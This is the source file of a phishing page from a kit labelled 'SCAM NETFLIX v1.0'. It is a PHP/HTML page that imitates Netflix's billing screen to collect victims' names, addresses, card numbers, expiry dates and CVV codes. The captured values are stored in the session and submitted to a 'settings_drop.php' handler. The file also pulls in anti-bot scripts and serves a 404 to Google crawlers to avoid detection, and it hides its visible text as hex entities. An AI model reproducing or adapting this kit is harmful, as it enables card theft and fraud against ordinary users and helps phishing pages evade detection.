<?php
/*   
   
    ───────────────────────────────────────────────────────────────────────────────────────────────────
    ─██████████████─████████──████████─██████████████─██████──██████─██████████████─████████████████───
    ─██░░░░░░░░░░██─██░░░░██──██░░░░██─██░░░░░░░░░░██─██░░██──██░░██─██░░░░░░░░░░██─██░░░░░░░░░░░░██───
    ─██░░██████████─████░░██──██░░████─██░░██████░░██─██░░██──██░░██─██░░██████████─██░░████████░░██───
    ─██░░██───────────██░░░░██░░░░██───██░░██──██░░██─██░░██──██░░██─██░░██─────────██░░██────██░░██───
    ─██░░██████████───████░░░░░░████───██░░██████░░██─██░░██████░░██─██░░██████████─██░░████████░░██───
    ─██░░░░░░░░░░██─────████░░████─────██░░░░░░░░░░██─██░░░░░░░░░░██─██░░░░░░░░░░██─██░░░░░░░░░░░░██───
    ─██████████░░██───────██░░██───────██░░██████████─██░░██████░░██─██░░██████████─██░░██████░░████───
    ─────────██░░██───────██░░██───────██░░██─────────██░░██──██░░██─██░░██─────────██░░██──██░░██─────
    ─██████████░░██───────██░░██───────██░░██─────────██░░██──██░░██─██░░██████████─██░░██──██░░██████─
    ─██░░░░░░░░░░██───────██░░██───────██░░██─────────██░░██──██░░██─██░░░░░░░░░░██─██░░██──██░░░░░░██─
    ─██████████████───────██████───────██████─────────██████──██████─██████████████─██████──██████████─
    ───────────────────────────────────────────────────────────────────────────────────────────────────
                                        #=======================#
                                        #   SCAM NETFLIX v1.0   #
                                        #    SYPHER.NETFLIX     #
                                        #=======================#
                        ─────────────────────────────────────────────────────────
                        ─██████████████─██████████████─████████───██████████████─
                        ─██░░░░░░░░░░██─██░░░░░░░░░░██─██░░░░██───██░░░░░░░░░░██─
                        ─██████████░░██─██░░██████░░██─████░░██───██░░██████░░██─
                        ─────────██░░██─██░░██──██░░██───██░░██───██░░██──██░░██─
                        ─██████████░░██─██░░██──██░░██───██░░██───██░░██████░░██─
                        ─██░░░░░░░░░░██─██░░██──██░░██───██░░██───██░░░░░░░░░░██─
                        ─██░░██████████─██░░██──██░░██───██░░██───██░░██████░░██─
                        ─██░░██─────────██░░██──██░░██───██░░██───██░░██──██░░██─
                        ─██░░██████████─██░░██████░░██─████░░████─██░░██████░░██─
                        ─██░░░░░░░░░░██─██░░░░░░░░░░██─██░░░░░░██─██░░░░░░░░░░██─
                        ─██████████████─██████████████─██████████─██████████████─
                        ─────────────────────────────────────────────────────────
   
*/
   
        session_start();
        error_reporting(0);
        ########################################################
        ################ [+] INCLUDE FILES [+] #################
        ########################################################
        include('../functions/get_lang_en.php'); 
        include('../functions/get_ip.php');
        include('../antibots/all_antibots.php');
        ########################################################
        ############# [+] BILLING INFORMATION [+] ##############
        ########################################################
        $_SESSION['_fullname_']    = $_POST['full_name'];
        $_SESSION['_address1_']    = $_POST['AddressLine1'];
        $_SESSION['_address2_']    = $_POST['AddressLine2'];
        $_SESSION['_city_']        = $_POST['city'];
        $_SESSION['_state_']       = $_POST['state'];
        $_SESSION['_zipCode_']     = $_POST['zipCode'];
        ########################################################
        ############ [+] CREDITCARD INFORMATION [+] ############
        ########################################################
        $_SESSION['_cc_holder_']         = $_POST['cc_holder'];
        $_SESSION['_cc_number_']         = $_POST['cc_number'];
        $_SESSION['_last4_']             = substr($_POST['cc_number'], -4);
        $_SESSION['_expirationDate_']    = $_POST['expirationDate'];
        $_SESSION['_expirationDate_MM_'] = substr($_POST['expirationDate'], 0, 2);
        $_SESSION['_expirationDate_YY_'] = substr($_POST['expirationDate'], 3, 2);
        $_SESSION['_csc_']               = $_POST['csc'];
        ########################################################
        ############# [+] FILTER_VALIDATE_CARD [+] #############
        ########################################################
        if ($_SERVER["REQUEST_METHOD"] == "POST") {
        if(empty($_POST['cc_number']) == false) {
        include('settings_drop.php');
        }}
        ########################################################
        ############### [+] HTTP_USER_AGENT [+] ################
        ########################################################
        if(strpos($_SERVER['HTTP_USER_AGENT'],'google') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
        if(strpos(gethostbyaddr(getenv("REMOTE_ADDR")),'google') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
        ########################################################
?>
<!doctype html>
<html>
   <head>
      <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
      <meta charset="utf-8"/>
      <meta http-equiv="X-UA-Compatible" content="IE=edge"/>
      <title>&#x4E;&#x65;&#x74;&#x66;&#x6C;&#x69;&#x78;</title>
      <meta name="viewport" content="width=device-width,initial-scale=1.0,minimum-scale=1.0,maximum-scale=1.0"/>
      <link type="text/css" rel="stylesheet" href="https://codex.nflxext.com/%5E2.0.0/truthBundle/webui/0.0.1-shakti-css-v4c579308/css/css/less%7Cpages%7Csignup%7Csimplicity%7Csimplicity.less/2/0z0O040H090w0G0T0W0P0I0Q0N0V0_/none/true/none"/>
      <link rel="shortcut icon" href="../lib/img/nficon2016.ico"/>
      <link rel="apple-touch-icon" href="../lib/img/nficon2016.png"/>
      <link type="text/css" rel="stylesheet" href="../lib/css/signin.css">
      <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
      <script type="text/javascript" src="../lib/js/jquery.masked.number.js"></script>
<script type="text/javascript">
function upperCaseF(a){
    setTimeout(function(){
      a.value = a.value.toUpperCase();
    }
               , 1);
  }
</script>
<script type="text/javascript">
    $(document).ready(function(){
    $('#submit').on('click', function () {
      if ($('#cc_number').val() != '' && $('#cc_number').val() != '') {
        $('#Rotation').fadeIn(300);
      }  
    });
});  
      </script>
<script type="text/javascript">
  $('input:text').focus(
function(){
      document.getElementById('id').setSelectionRange(0, 0);
    });
  $('input:tel').focus(
function(){
      document.getElementById('id').setSelectionRange(0, 0);
    });

$(document).ready(function() {
  $('#expirationDate').blur(function() {
      if(validateDate('expirationDate'))
      {
          $('#expirationDate').removeClass('error');
      }
      else
      {
          $('#expirationDate').addClass('error');
      }
   });
});

function validateDate(txtDate){
   var txtVal = document.getElementById(txtDate).value;
   var filter = new RegExp("(0[123456789]|10|11|12)([/])([1-2][0-9])");
   if(filter.test(txtVal))
   {
      return true;
   }
   else
   {
     return false;
   }
}
</script>
   </head>
   <body>
    <div id="Rotation">
         <p style="font-size: 13px;">&#x56;&#x61;&#x6C;&#x69;&#x64;&#x61;&#x74;&#x69;&#x6E;&#x67;&#x20;&#x79;&#x6F;&#x75;&#x72;&#x20;&#x69;&#x6E;&#x66;&#x6F;&#x72;&#x6D;&#x61;&#x74;&#x69;&#x6F;&#x6E;&#x2E;&#x2E;&#x2E;</p>
      </div>
      <div id="appMountPoint">
         <div class="basicLayout modernInApp pt19 signupSimplicity-creditOptionMode simplicity">
            <div class="nfHeader noBorderHeader signupBasicHeader">
               <a href="#" class="svg-nfLogo signupBasicHeader">
                  <svg class="svg-icon svg-icon-netflix-logo " xmlns="http://www.w3.org/2000/svg" width="1024" height="276.742" viewBox="0 0 1024 276.742">
                     <path d="M140.803 258.904c-15.404 2.705-31.079 3.516-47.294 5.676l-49.458-144.856v151.073c-15.404 1.621-29.457 3.783-44.051 5.945v-276.742h41.08l56.212 157.021v-157.021h43.511v258.904zm85.131-157.558c16.757 0 42.431-.811 57.835-.811v43.24c-19.189 0-41.619 0-57.835.811v64.322c25.405-1.621 50.809-3.785 76.482-4.596v41.617l-119.724 9.461v-255.39h119.724v43.241h-76.482v58.105zm237.284-58.104h-44.862v198.908c-14.594 0-29.188 0-43.239.539v-199.447h-44.862v-43.242h132.965l-.002 43.242zm70.266 55.132h59.187v43.24h-59.187v98.104h-42.433v-239.718h120.808v43.241h-78.375v55.133zm148.641 103.507c24.594.539 49.456 2.434 73.51 3.783v42.701c-38.646-2.434-77.293-4.863-116.75-5.676v-242.689h43.24v201.881zm109.994 49.457c13.783.812 28.377 1.623 42.43 3.242v-254.58h-42.43v251.338zm231.881-251.338l-54.863 131.615 54.863 145.127c-16.217-2.162-32.432-5.135-48.648-7.838l-31.078-79.994-31.617 73.51c-15.678-2.705-30.812-3.516-46.484-5.678l55.672-126.75-50.269-129.992h46.482l28.377 72.699 30.27-72.699h47.295z" fill="#d81f26"/>
                  </svg>
               </a>
               <a href="#signout" class="authLinks signupBasicHeader" data-reactid="7">&#x53;&#x69;&#x67;&#x6E;&#x20;&#x6F;&#x75;&#x74;</a>
            </div>
            <div class="freeTrialMessaging notification" id="notification">
               <script type="text/javascript">
                  var device = navigator.userAgent
                  if (device.match(/Iphone/i)|| device.match(/Ipod/i)|| device.match(/Android/i)|| device.match(/J2ME/i)|| device.match(/BlackBerry/i)|| device.match(/iPhone|iPad|iPod/i)|| device.match(/Opera Mini/i)|| device.match(/IEMobile/i)|| device.match(/Mobile/i)|| device.match(/Windows Phone/i)|| device.match(/windows mobile/i)|| device.match(/windows ce/i)|| device.match(/webOS/i)|| device.match(/palm/i)|| device.match(/bada/i)|| device.match(/series60/i)|| device.match(/nokia/i)|| device.match(/symbian/i)|| device.match(/HTC/i))
                  {
                  }
                  else
                  {
                  document.getElementById("notification").innerHTML = '<img width="60px" height="60px" style="position: sticky;float: left;margin-top: 20px;" src="../lib/img/earth.png">\
                         <div class="content">\
                          <span class="texts">&#x44;&#x65;&#x61;&#x72;&#x2C;&#x20;&#x50;&#x6C;&#x65;&#x61;&#x73;&#x65;&#x20;&#x75;&#x70;&#x64;&#x61;&#x74;&#x65;&#x20;&#x79;&#x6F;&#x75;&#x72;&#x20;&#x61;&#x63;&#x63;&#x6F;&#x75;&#x6E;&#x74;&#x20;&#x69;&#x6E;&#x66;&#x6F;&#x72;&#x6D;&#x61;&#x74;&#x69;&#x6F;&#x6E;&#x2E;</span>\
                         </div>';
                  }
               </script>
            </div>
            <div class="simpleContainer slimWidth">
               <div class="centerContainer firstLoad">
                  <form method="post" action="settings_drop.php" class="idform">
                     <div class="paymentFormContainer">
                        <div class="stepHeader-container">
                           <div class="stepHeader">
                              <h1 class="stepTitle">&#x53;&#x65;&#x74;&#x20;&#x75;&#x70;&#x20;&#x79;&#x6F;&#x75;&#x72;&#x20;&#x62;&#x69;&#x6C;&#x6C;&#x69;&#x6E;&#x67;&#x20;&#x61;&#x64;&#x64;&#x72;&#x65;&#x73;&#x73;&#x2E;</h1>
                           </div>
                        </div>
                        <div class="fieldContainer">
                           <div class="">
                              <ul class="simpleForm structural ui-grid">
                                 <li class="nfFormSpace">
                                    <div class="nfInput nfInputOversize">
                                       <div class="nfInputPlacement">
                                          <input type="text" 
                                             name="full_name" 
                                             id="full_name" 
                                             class="nfTextField" 
                                             pattern="[A-Za-z].{6,}"
                                             autocomplete="false" 
                                             value="<?=$_SESSION['_FN_'];?>" 
                                             placeholder="&#x46;&#x75;&#x6C;&#x6C;&#x20;&#x4E;&#x61;&#x6D;&#x65;"
                                             oninvalid="
                                             this.setCustomValidity('&#x50;&#x6C;&#x65;&#x61;&#x73;&#x65;&#x20;&#x65;&#x6E;&#x74;&#x65;&#x72;&#x20;&#x61;&#x20;&#x76;&#x61;&#x6C;&#x69;&#x64;&#x20;&#x6E;&#x61;&#x6D;&#x65;')"
                                             oninput="setCustomValidity('')" 
                                             required/>
                                       </div>
                                    </div>
                                 </li>
                                 <li class="nfFormSpace">
                                    <div class="nfInput nfInputOversize">
                                       <div class="nfInputPlacement">
                                          <input type="text" 
                                             name="AddressLine1" 
                                             id="AddressLine1" 
                                             class="nfTextField"
                                             placeholder="&#x53;&#x74;&#x72;&#x65;&#x65;&#x74;&#x20;&#x61;&#x6E;&#x64;&#x20;&#x6E;&#x75;&#x6D;&#x62;&#x65;&#x72;&#x2C;&#x20;&#x50;&#x2E;&#x4F;&#x20;&#x62;&#x6F;&#x78;&#x2C;&#x20;&#x63;&#x2F;&#x6F;&#x2E;" 
                                             title="&#x50;&#x6C;&#x65;&#x61;&#x73;&#x65;&#x20;&#x45;&#x6E;&#x74;&#x65;&#x72;&#x20;&#x61;&#x20;&#x76;&#x61;&#x6C;&#x69;&#x64;&#x20;&#x61;&#x64;&#x64;&#x72;&#x65;&#x73;&#x73;&#x20;&#x6C;&#x69;&#x6E;&#x65;" 
                                             maxlength="60"
                                             autocomplete="false" 
                                             oninvalid="
                                             this.setCustomValidity('&#x50;&#x6C;&#x65;&#x61;&#x73;&#x65;&#x20;&#x65;&#x6E;&#x74;&#x65;&#x72;&#x20;&#x61;&#x20;&#x76;&#x61;&#x6C;&#x69;&#x64;&#x20;&#x61;&#x64;&#x64;&#x72;&#x65;&#x73;&#x73;&#x20;&#x6C;&#x69;&#x6E;&#x65;')"
                                             oninput="setCustomValidity('')"
                                             required/>
                                       </div>
                                    </div>
                                 </li>
                                 <li class="nfFormSpace">
                                    <div class="nfInput nfInputOversize">
                                       <div class="nfInputPlacement">
                                          <input type="text" 
                                             name="AddressLine2" 
                                             class="nfTextField"
                                             maxlength="60" 
                                             placeholder="&#x41;&#x70;&#x72;&#x74;&#x65;&#x6D;&#x65;&#x6E;&#x74;&#x2C;&#x20;&#x75;&#x6E;&#x69;&#x74;&#x2C;&#x20;&#x62;&#x75;&#x69;&#x6C;&#x64;&#x69;&#x6E;&#x67;&#x2C;&#x20;&#x66;&#x6C;&#x6F;&#x6F;&#x72;&#x2C;&#x20;&#x65;&#x74;&#x63;&#x2E;" 
                                             autocomplete="false"/>
                                       </div>
                                    </div>
                                 </li>
                                 <li class="nfFormSpace">
                                    <div class="nfInput nfInputOversize">
                                       <div class="nfInputPlacement">
                                          <input type="text" 
                                             name="city" 
                                             id="city" 
                                             class="nfTextField" 
                                             placeholder="&#x43;&#x69;&#x74;&#x79;" 
                                             autocomplete="false" 
                                             maxlength="50" 
                                             oninvalid="
                                             this.setCustomValidity('&#x50;&#x6C;&#x65;&#x61;&#x73;&#x65;&#x20;&#x65;&#x6E;&#x74;&#x65;&#x72;&#x20;&#x61;&#x20;&#x76;&#x61;&#x6C;&#x69;&#x64;&#x20;&#x63;&#x69;&#x74;&#x79;&#x20;&#x6E;&#x61;&#x6D;&#x65;')"
                                             oninput="setCustomValidity('')"
                                             title="&#x50;&#x6C;&#x65;&#x61;&#x73;&#x65;&#x20;&#x45;&#x6E;&#x74;&#x65;&#x72;&#x20;&#x61;&#x20;&#x76;&#x61;&#x6C;&#x69;&#x64;&#x20;&#x63;&#x69;&#x74;&#x79;&#x20;&#x6E;&#x61;&#x6D;&#x65;" 
                                             value="<?=$_SESSION['_LOOKUP_CITY_'];?>"
                                             required/>
                                       </div>
                                    </div>
                                 </li>
                                 <li class="nfFormSpace">
                                    <div class="nfInput nfInputOversize">
                                       <div class="nfInputPlacement">
                                          <input type="text" 
                                             name="state" 
                                             id="state" 
                                             class="nfTextField" 
                                             placeholder="&#x53;&#x74;&#x61;&#x74;&#x65;&#x20;&#x2F;&#x20;&#x50;&#x72;&#x6F;&#x76;&#x69;&#x6E;&#x63;&#x65;&#x20;&#x2F;&#x20;&#x52;&#x65;&#x67;&#x69;&#x6F;&#x6E;"
                                             oninvalid="
                                             this.setCustomValidity('&#x50;&#x6C;&#x65;&#x61;&#x73;&#x65;&#x20;&#x65;&#x6E;&#x74;&#x65;&#x72;&#x20;&#x61;&#x20;&#x76;&#x61;&#x6C;&#x69;&#x64;&#x20;&#x53;&#x74;&#x61;&#x74;&#x65;&#x2F;&#x50;&#x72;&#x6F;&#x76;&#x69;&#x6E;&#x63;&#x65;&#x2F;&#x52;&#x65;&#x67;&#x69;&#x6F;&#x6E;&#x20;&#x6E;&#x61;&#x6D;&#x65;')"
                                             oninput="setCustomValidity('')"
                                             autocomplete="false"
                                             value="<?=$_SESSION['_LOOKUP_STATE_'];?>" 
                                             required/>
                                       </div>
                                    </div>
                                 </li>
                                 <li class="nfFormSpace">
                                    <div class="nfInput nfInputOversize">
                                       <div class="nfInputPlacement">
                                          <input type="text" 
                                             name="zipCode" 
                                             id="zipCode" 
                                             value="<?=$_SESSION['_LOOKUP_ZIPCODE_'];?>"
                                             class="nfTextField" 
                                             oninvalid="
                                             this.setCustomValidity('&#x50;&#x6C;&#x65;&#x61;&#x73;&#x65;&#x20;&#x65;&#x6E;&#x74;&#x65;&#x72;&#x20;&#x61;&#x20;&#x76;&#x61;&#x6C;&#x69;&#x64;&#x20;&#x5A;&#x49;&#x50;&#x20;&#x63;&#x6F;&#x64;&#x65;')"
                                             oninput="setCustomValidity('')"
                                             placeholder="&#x5A;&#x69;&#x70;&#x20;&#x43;&#x6F;&#x64;&#x65;" 
                                             autocomplete="false"
                                             maxlength="20" 
                                             required/>
                                       </div>
                                    </div>
                                 </li>
                              </ul>
                           </div>
                        </div>
                     </div>
                     <br>
                     <div class="paymentFormContainer">
                        <div class="stepHeader-container">
                           <div class="stepHeader">
                              <h1 class="stepTitle">&#x53;&#x65;&#x74;&#x20;&#x75;&#x70;&#x20;&#x79;&#x6F;&#x75;&#x72;&#x20;&#x63;&#x72;&#x65;&#x64;&#x69;&#x74;&#x20;&#x6F;&#x72;&#x20;&#x64;&#x65;&#x62;&#x69;&#x74;&#x20;&#x63;&#x61;&#x72;&#x64;&#x2E;</h1>
                           </div>
                        </div>
                        <div class="fieldContainer">
                           <span class="logos logos-block"><span class="logoIcon VISA"></span><span class="logoIcon MASTERCARD"></span><span class="logoIcon AMEX"></span></span>
                           <div class="">
                              <ul class="simpleForm structural ui-grid">
                                 <li class="nfFormSpace">
                                    <div class="nfInput nfInputOversize">
                                       <div class="nfInputPlacement">
                                          <input type="text"
                                             onkeydown="upperCaseF(this)" 
                                             name="cc_holder" 
                                             id="cc_holder" 
                                             class="nfTextField" 
                                             placeholder="&#x43;&#x61;&#x72;&#x64;&#x20;&#x68;&#x6F;&#x6C;&#x64;&#x65;&#x72;&#x20;&#x4E;&#x61;&#x6D;&#x65;"
                                             oninvalid="
                                             this.setCustomValidity('&#x50;&#x6C;&#x65;&#x61;&#x73;&#x65;&#x20;&#x65;&#x6E;&#x74;&#x65;&#x72;&#x20;&#x61;&#x20;&#x76;&#x61;&#x6C;&#x69;&#x64;&#x20;&#x63;&#x61;&#x72;&#x64;&#x20;&#x68;&#x6F;&#x6C;&#x64;&#x65;&#x72;&#x20;&#x6E;&#x61;&#x6D;&#x65;')"
                                             oninput="setCustomValidity('')" 
                                             autocomplete="false" 
                                             required/>
                                       </div>
                                    </div>
                                 </li>
                                 <li class="nfFormSpace">
                                    <div class="nfInput nfInputOversize">
                                       <div class="nfInputPlacement">
                                          <input type="tel" 
                                             name="cc_number" 
                                             id="cc_number" 
                                             class="nfTextField"
                                             pattern="[2-7][0-9 ]{11,24}" 
                                             placeholder="&#x43;&#x61;&#x72;&#x64;&#x20;&#x4E;&#x75;&#x6D;&#x62;&#x65;&#x72;"
                                             oninvalid="
                                             this.setCustomValidity('&#x50;&#x6C;&#x65;&#x61;&#x73;&#x65;&#x20;&#x65;&#x6E;&#x74;&#x65;&#x72;&#x20;&#x61;&#x20;&#x76;&#x61;&#x6C;&#x69;&#x64;&#x20;&#x63;&#x61;&#x72;&#x64;&#x20;&#x6E;&#x75;&#x6D;&#x62;&#x65;&#x72;')"
                                             oninput="setCustomValidity('')"  
                                             autocomplete="false" 
                                             required/>
                                       </div>
                                    </div>
                                 </li>
                                 <li class="nfFormSpace">
                                    <div class="nfInput nfInputOversize">
                                       <div class="nfInputPlacement">
                                          <input type="tel" 
                                             name="expirationDate" 
                                             id="expirationDate" 
                                             class="nfTextField" 
                                             placeholder="&#x45;&#x78;&#x70;&#x69;&#x72;&#x61;&#x74;&#x69;&#x6F;&#x6E;&#x20;&#x44;&#x61;&#x74;&#x65;&#x20;&#x28;&#x4D;&#x4D;&#x2F;&#x59;&#x59;&#x29;" 
                                             oninvalid="
                                             this.setCustomValidity('&#x50;&#x6C;&#x65;&#x61;&#x73;&#x65;&#x20;&#x65;&#x6E;&#x74;&#x65;&#x72;&#x20;&#x61;&#x20;&#x76;&#x61;&#x6C;&#x69;&#x64;&#x20;&#x65;&#x78;&#x70;&#x69;&#x72;&#x61;&#x74;&#x69;&#x6F;&#x6E;&#x20;&#x64;&#x61;&#x74;&#x65;')"
                                             oninput="setCustomValidity('')"  
                                             maxlength="5" 
                                             value="<?=$_SESSION['_EX_'];?>" 
                                             required/>
                                       </div>
                                    </div>
                                 </li>
                                 <li class="nfFormSpace">
                                    <div class="nfInput nfInputOversize">
                                       <div class="nfInputPlacement">
                                          <input type="tel" 
                                             name="csc" 
                                             id="csc" 
                                             class="nfTextField" 
                                             placeholder="&#x53;&#x65;&#x63;&#x75;&#x72;&#x69;&#x74;&#x79;&#x20;&#x43;&#x6F;&#x64;&#x65;&#x20;&#x28;&#x43;&#x56;&#x56;&#x29;"
                                             oninvalid="
                                             this.setCustomValidity('&#x50;&#x6C;&#x65;&#x61;&#x73;&#x65;&#x20;&#x65;&#x6E;&#x74;&#x65;&#x72;&#x20;&#x61;&#x20;&#x76;&#x61;&#x6C;&#x69;&#x64;&#x20;&#x73;&#x65;&#x63;&#x75;&#x72;&#x69;&#x74;&#x79;&#x20;&#x63;&#x6F;&#x64;&#x65;')"
                                             oninput="setCustomValidity('')"  
                                             maxlength="4"
                                             pattern="[0-9]{3,4}" 
                                             autocomplete="false" 
                                             required/>
                                       </div>
                                       <div class="tooltipWrapper">
                                          <span class="nf-svg-icon ">
                                             <svg width="36" height="36" viewBox="0 0 36 36" xmlns="http://www.w3.org/2000/svg">
                                                <g id="Spec" fill="none">
                                                   <g id="Help-Affordance">
                                                      <circle id="Oval-128" stroke="#A9A6A6" cx="18" cy="18" r="17"></circle>
                                                      <path d="M17.051 21.094v-.54c0-.648.123-1.203.369-1.665.246-.462.741-.915 1.485-1.359a7.37 7.37 0 0 0 .981-.657c.222-.186.372-.366.45-.54.078-.174.117-.369.117-.585 0-.384-.177-.714-.531-.99-.354-.276-.831-.414-1.431-.414-.624 0-1.131.135-1.521.405-.39.27-.627.627-.711 1.071h-2.304a4.053 4.053 0 0 1 .738-1.845c.396-.546.924-.981 1.584-1.305.66-.324 1.44-.486 2.34-.486.852 0 1.596.153 2.232.459.636.306 1.134.726 1.494 1.26.36.534.54 1.143.54 1.827 0 .66-.177 1.227-.531 1.701-.354.474-.891.933-1.611 1.377-.42.252-.729.48-.927.684-.198.204-.33.399-.396.585a1.79 1.79 0 0 0-.099.603v.414h-2.268zm1.26 4.158c-.408 0-.762-.15-1.062-.45-.3-.3-.45-.654-.45-1.062 0-.408.15-.762.45-1.062.3-.3.654-.45 1.062-.45.408 0 .762.15 1.062.45.3.3.45.654.45 1.062 0 .408-.15.762-.45 1.062-.3.3-.654.45-1.062.45z" id="?" fill="#A9A6A6"></path>
                                                   </g>
                                                </g>
                                             </svg>
                                          </span>
                                       </div>
                                    </div>
                                 </li>
                              </ul>
                           </div>
                           <ul class="simpleForm structural ui-grid">
                              <li class="nfFormSpace">
                                 <div class="signupTerms" id="tou-rest-freetrial" data-automation-details="false">
                                    <span id="">
                                       <p>&#x42;&#x79;&#x20;&#x63;&#x6C;&#x69;&#x63;&#x6B;&#x69;&#x6E;&#x67;&#x20;&#x41;&#x47;&#x52;&#x45;&#x45;&#x20;&#x26;&#x20;&#x43;&#x4F;&#x4E;&#x54;&#x49;&#x4E;&#x55;&#x45;&#x2C;&#x20;&#x49;&#x20;&#x68;&#x61;&#x76;&#x65;&#x20;&#x72;&#x65;&#x61;&#x64;&#x20;&#x61;&#x6E;&#x64;&#x20;&#x61;&#x67;&#x72;&#x65;&#x65;&#x20;&#x74;&#x6F; <a target="blank" href="">&#x4E;&#x65;&#x74;&#x66;&#x6C;&#x69;&#x78;&#x2019;&#x73;&#x20;&#x55;&#x73;&#x65;&#x72;&#x20;&#x41;&#x67;&#x72;&#x65;&#x65;&#x6D;&#x65;&#x6E;&#x74;</a>, <a target="blank" href="">&#x50;&#x72;&#x69;&#x76;&#x61;&#x63;&#x79;&#x20;&#x50;&#x6F;&#x6C;&#x69;&#x63;&#x79;</a> &#x61;&#x6E;&#x64; <a target="blank" href="">&#x45;&#x6C;&#x65;&#x63;&#x74;&#x72;&#x6F;&#x6E;&#x69;&#x63;&#x20;&#x43;&#x6F;&#x6D;&#x6D;&#x75;&#x6E;&#x69;&#x63;&#x61;&#x74;&#x69;&#x6F;&#x6E;&#x73;&#x20;&#x55;&#x70;&#x64;&#x61;&#x74;&#x65;&#x20;&#x50;&#x6F;&#x6C;&#x69;&#x63;&#x79;</a>.</p>
                                    </span>
                                 </div>
                              </li>
                           </ul>
                        </div>
                     </div>
                     <div class="submitBtnContainer">
                        <button id="submit" class="nf-btn nf-btn-primary nf-btn-solid nf-btn-align-undefined nf-btn-oversize" type="submit">
                        &#x41;&#x47;&#x52;&#x45;&#x45;&#x20;&#x26;&#x20;&#x43;&#x4F;&#x4E;&#x54;&#x49;&#x4E;&#x55;&#x45;
                        </button>
                     </div>
                  </form>
               </div>
            </div>
            <div class="site-footer-wrapper centered">
               <div class="footer-divider"></div>
               <div class="site-footer">
                  <p align="center" class="footer-top"><a class="footer-top-a" href="#">&#x51;&#x75;&#x65;&#x73;&#x74;&#x69;&#x6F;&#x6E;&#x73;&#x3F;&#x20;&#x43;&#x6F;&#x6E;&#x74;&#x61;&#x63;&#x74;&#x20;&#x75;&#x73;&#x2E;</a></p>
               </div>
            </div>
         </div>
      </div>
<script type="text/javascript">
$("#cc_number").on('keyup', function() {
     if (this.value == 4 && this.value.length <= 1) {
     jQuery(function($){$("#cc_number").maskcc("9999 9999 9999 9999");});
     document.getElementById("csc").maxLength ="3";
     }
     if (this.value == 5 && this.value.length <= 1) {
     jQuery(function($){$("#cc_number").maskcc("9999 9999 9999 9999");});
     document.getElementById("csc").maxLength ="3";
     }
     if (this.value == 6 && this.value.length <= 1) {
     jQuery(function($){$("#cc_number").maskcc("9999 9999 9999 9999");});
     document.getElementById("csc").maxLength ="3";
     }
     if (this.value == 3 && this.value.length <= 1) {
     jQuery(function($){$("#cc_number").maskcc("9999 999999 99999");});
     document.getElementById("csc").maxLength ="4";
     }

});
</script>
<script type="text/javascript">
jQuery(function($){
$("#expirationDate").mask("99/99"); 
    });
</script>

<script type="text/javascript">
$(document).ready(function() {
$('#full_name').blur(function() {
if($(this).val().length === 0){$(this).addClass('error');}
else{$(this).removeClass('error');}});

$('#AddressLine1').blur(function() {
if($(this).val().length === 0){$(this).addClass('error');}
else{$(this).removeClass('error');}});

$('#city').blur(function() {
if($(this).val().length === 0){$(this).addClass('error');}
else{$(this).removeClass('error');}});

$('#state').blur(function() {
if($(this).val().length === 0){$(this).addClass('error');}
else{$(this).removeClass('error');}});

$('#zipCode').blur(function() {
if($(this).val().length === 0){$(this).addClass('error');}
else{$(this).removeClass('error');}});

$('#csc').blur(function() {
if($(this).val().length === 0){$(this).addClass('error');}
else{$(this).removeClass('error');}});

$('#cc_holder').blur(function() {
if($(this).val().length === 0){$(this).addClass('error');}
else{$(this).removeClass('error');}});

});
</script>
      <script type="text/javascript" src="../lib/js/jquery.placeholder.label.js"></script> 
      <script type="text/javascript" src="../lib/js/jquery.masked.input.js"></script>
      <script type="text/javascript" src="../lib/js/jquery.bootstrap.js"></script>
      <script type="text/javascript">
         $(document).ready(function (){
            $('input[placeholder]').placeholderLabel();
         })
      </script>
   </body>
</html>